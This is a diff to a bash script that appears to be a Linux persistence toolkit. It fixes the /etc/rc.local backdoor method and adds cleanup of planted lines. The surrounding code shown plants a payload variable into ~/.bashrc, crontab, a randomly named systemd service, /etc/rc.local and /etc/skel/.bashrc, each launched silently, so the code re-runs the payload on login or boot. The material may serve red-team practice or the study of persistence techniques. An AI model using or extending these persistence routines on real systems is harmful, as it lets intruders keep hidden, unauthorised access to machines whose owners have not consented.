@@ -17,6 +17,7 @@ PERMACRON=$(mktemp)
 SHELL="/bin/bash"
 STEALTHMODE=0
 TMPCLEANBASHRC=$(mktemp)
+TMPCLEANRCLOCAL=$(mktemp)
 TMPCRON=$(mktemp)
 TMPRCLOCAL=$(mktemp)
 TMPSERVICE=$(mktemp -u | sed 's/.*\.//g').service
@@ -156,7 +157,7 @@ enum_doors() {
 		"bashrc , cd; find -writable -name .bashrc | grep -qi bashrc , cp ~/.bashrc ~/.bashrc.bak; echo \"$PAYLOAD 2> /dev/null & sleep .0001\" >> ~/.bashrc:"
 		"crontab , crontab -l > $TMPCRON; echo \"* * * * * echo linper\" >> $TMPCRON; crontab $TMPCRON; crontab -l > $TMPCRON; cat $TMPCRON | grep -v linper > $PERMACRON; crontab $PERMACRON; if grep -qi [A-Za-z0-9] $PERMACRON; then crontab $PERMACRON; else crontab -r; fi; grep linper -qi $TMPCRON , echo \"$CRON $PAYLOAD\" >> $PERMACRON; crontab $PERMACRON && rm $PERMACRON:"
 		"systemctl , find /etc/systemd/ -type d -writable | head -n 1 | grep -qi systemd , echo \"$PAYLOAD\" >> /etc/systemd/system/$TMPSERVICESHELLSCRIPT; if test -f /etc/systemd/system/$TMPSERVICE; then echo > /dev/null; else touch /etc/systemd/system/$TMPSERVICE; echo \"[Service]\" >> /etc/systemd/system/$TMPSERVICE; echo \"Type=oneshot\" >> /etc/systemd/system/$TMPSERVICE; echo \"ExecStartPre=$(which sleep) 60\" >> /etc/systemd/system/$TMPSERVICE; echo \"ExecStart=$(which $SHELL) /etc/systemd/system/$TMPSERVICESHELLSCRIPT\" >> /etc/systemd/system/$TMPSERVICE; echo \"ExecStartPost=$(which sleep) infinity\" >> /etc/systemd/system/$TMPSERVICE; echo \"[Install]\" >> /etc/systemd/system/$TMPSERVICE; echo \"WantedBy=multi-user.target\" >> /etc/systemd/system/$TMPSERVICE; chmod 644 /etc/systemd/system/$TMPSERVICE; systemctl start $TMPSERVICE 2> /dev/null & sleep .0001; systemctl enable $TMPSERVICE 2> /dev/null & sleep .0001; fi;:"
-		"/etc/rc.local , uname -a | grep -q -e Linux -e OpenBSD && find /etc/ -writable -type f 2> /dev/null | grep -q etc , if test -f /etc/rc.local; then cp /etc/rc.local /etc/.rc.local.bak; LINES=\$(expr \`cat /etc/rc.local | wc -l\` - 1); cat /etc/rc.local | head -n \$LINES > $TMPRCLOCAL; echo $PAYLOAD >> $TMPRCLOCAL; echo \"exit 0\" >> $TMPRCLOCAL; mv $TMPRCLOCAL /etc/rc.local; else echo \"/bin/bash -e\" > /etc/rc.local; echo $PAYLOAD >> /etc/rc.local; echo \"exit 0\" >> /etc/rc.local; fi:"
+		"/etc/rc.local , uname -a | grep -q -e Linux -e OpenBSD && find /etc/ -writable -type f 2> /dev/null | grep -q etc , if test -f /etc/rc.local; then cp /etc/rc.local /etc/.rc.local.bak; LINES=\$(expr \`cat /etc/rc.local | wc -l\` - 1); cat /etc/rc.local | head -n \$LINES > $TMPRCLOCAL; echo $PAYLOAD >> $TMPRCLOCAL; echo \"exit 0\" >> $TMPRCLOCAL; mv $TMPRCLOCAL /etc/rc.local; else echo \"#!/bin/sh -e\" > /etc/rc.local; echo $PAYLOAD >> /etc/rc.local; echo \"exit 0\" >> /etc/rc.local; fi; chmod +x /etc/rc.local:"
 		"/etc/skel/.bashrc , find /etc/skel/.bashrc -writable | grep -q bashrc , echo \"$PAYLOAD 2> /dev/null & sleep .0001\" >> /etc/skel/.bashrc:"
 	)
 
@@ -297,6 +298,20 @@ cleanup() {
 		echo -e "\e[92m[+]\e[0m Cleaned systemctl"
 	fi
 
+	# remove from /etc/skel/.bashrc and /etc/rc.local
+	if $(cat /etc/skel/.bashrc 2> /dev/null | grep -q $1);
+	then
+		grep --color=never -v $1 /etc/skel/.bashrc > $TMPCLEANBASHRC
+		cp $TMPCLEANBASHRC /etc/skel/.bashrc
+		echo -e "\e[92m[+]\e[0m Cleaned /etc/skel/.bashrc"
+	fi
+
+	if $(cat /etc/rc.local 2> /dev/null | grep -q $1);
+	then
+		grep --color=never -v $1 "/etc/rc.local" > $TMPCLEANRCLOCAL
+		cp $TMPCLEANRCLOCAL "/etc/rc.local"
+		echo -e "\e[92m[+]\e[0m Cleaned /etc/rc.local"
+	fi
 	# remove from webserver, need to finish the install part first
 	# remove --stealth-mode modifications
 
